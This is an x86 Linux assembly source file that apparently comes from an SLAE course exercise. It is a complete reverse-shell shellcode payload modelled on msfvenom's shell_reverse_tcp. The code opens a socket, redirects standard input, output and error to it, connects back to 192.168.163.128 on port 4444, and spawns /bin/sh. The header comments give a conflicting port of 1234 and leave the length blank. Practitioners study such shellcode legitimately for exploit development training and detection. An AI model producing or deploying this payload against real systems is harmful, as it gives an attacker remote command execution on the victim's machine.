;Linux x86 reverse shell port:1234 Host Ip:192.168.163.128
;Auther: H4554n AlMusajjen
;website: https://h4554nalmusajjen.wordpress.com/
;Tested on i686 GNU/Linux
;Shellcode Length is:
;SLAE - 1057
;LPort   : 4444
;LHOST		:192.168.163.128
;Description : A linux/x86 reverse shell via /bin/sh. Created by analysing msfvenom;
;Size: 68
;
; msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.163.128 lport=4444 -f c

global _start

section .text

_start:
        ; int socketcall(int call, unsigned long *args) remember to place backwards!
	xor ebx,ebx	;setting ebx to zero
	push 0x66
	pop eax		;syscall for socketcall()
	cdq 		;setting edx to zero
	push ebx	;pushing EBX into stack (IPPROTO_IP = 0)
	inc ebx		;Incrementing EBX by 1
	push ebx	;Pushing EBX into stack (SOCK_STREAM = 1)
	push 0x2		;Push 2 into stack (AF_INET = 2)
	mov ecx,esp	;top of stack contains our arguments save address in ECX
	int 80h		;call the kernal

        xchg ebx,eax            ; Put socket descriptor in EBX and 0x5 in EAX
        pop ecx                 ; POP 3 into ECX for counter to be used in loop
loop:
        ; int dup2(int oldfd, int newfd)
        mov al,0x3f               ; syscall for dup2()
        int 80h                 ; call the kernel!!
        dec ecx                 ; count down to zero
        jns loop                ; If SF is not set, then, ECX is not negative so continue looping

connect:
	; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen)
 	push dword 0x80A3A8C0		;ip address backward 192.168.163.128
	push dword 0x5c110002 		;port number backward 4444
	mov ecx,esp
	mov al,0x66
	push eax
	push ecx
	push ebx
	mov bl,0x3
	mov ecx,esp
	int 80h

done:
    ; int execve(const char *filename, char *const argv[], char *const envp[])
  	push edx ; null
        push 0x68732f6e 
        push 0x69622f2f 
    	mov ebx, esp ; mv stack ptr to ebx
    	push edx ; null
    	push ebx ; push ptr addr
    	mov ecx, esp ; mv new stack ptr to ecx
        mov al, 0xb     ; sys_execve (11)
        int 0x80        ; init
